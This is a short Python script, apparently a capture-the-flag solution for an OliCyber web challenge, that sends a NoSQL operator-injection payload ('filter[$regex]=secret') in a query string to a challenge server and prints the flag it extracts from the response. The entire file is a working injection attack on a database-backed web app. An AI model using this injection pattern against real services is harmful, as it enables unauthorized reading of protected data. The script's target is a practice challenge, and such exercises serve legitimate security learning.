import requests
import re

url = "http://bibbodb.challs.olicyber.it/"

r = requests.get(url + "type?filter[$regex]=secret")

flag = re.search(r"flag\{.*\}", r.text)
print(flag.group())